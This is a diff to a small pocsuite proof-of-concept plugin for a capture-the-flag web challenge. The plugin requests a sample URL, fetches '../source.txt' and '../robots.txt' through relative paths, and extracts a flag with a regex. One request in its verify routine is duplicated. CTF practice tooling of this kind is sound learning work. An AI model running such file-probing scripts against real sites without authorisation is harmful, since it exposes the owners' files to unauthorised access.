@@ -6,7 +6,7 @@ from pocsuite.utils import register
 
 class TestPOC(POCBase):
     appName='CTF'
-    name='CheckRobots'
+    name='CheckInfo'
     vulID='00000'
     version='1.0'
     author='LzSkyline'
@@ -21,12 +21,21 @@ class TestPOC(POCBase):
     samples=['http://chinalover.sinaapp.com/web1/']
     def _attack(self):
         result={}
+        payload=""
+        param={}
+        resp=req.get(self.url,allow_redirects=False)
+        if "source.txt" in resp.content:
+            if self.url.endswith('/'):
+                vulurl = self.url + "../source.txt"
+            else:
+                vulurl = self.url + "/../source.txt"
+            resp=req.get(vulurl,allow_redirects=False)
+            result['FlagInfo']={}
+            result['FlagInfo']['SourceFile']="\n" + resp.content
         if self.url.endswith('/'):
             vulurl = self.url + "../robots.txt"
         else:
             vulurl = self.url + "/../robots.txt"
-        payload=""
-        param={}
         resp=req.get(vulurl,params=param,allow_redirects=False)
         match_result=re.search(self.params['name'] + '{(.*)}',resp.content)
         if match_result:
@@ -39,9 +48,17 @@ class TestPOC(POCBase):
     
     def _verify(self):
         result={}
-        vulurl=self.url + "/robots.txt"
+        resp=req.get(self.url,allow_redirects=False)
+        if "source.txt" in resp.content:
+            result['FlagInfo']={}
+            result['FlagInfo']['source.txt']="Existed"
+        if self.url.endswith('/'):
+            vulurl = self.url + "../robots.txt"
+        else:
+            vulurl = self.url + "/../robots.txt"
         payload=""
         param={}
+        resp=req.get(vulurl,params=param,allow_redirects=False)
         resp=req.get(vulurl,params=param,allow_redirects=False)
         if resp.status_code == 200:
             result['FlagInfo']={}
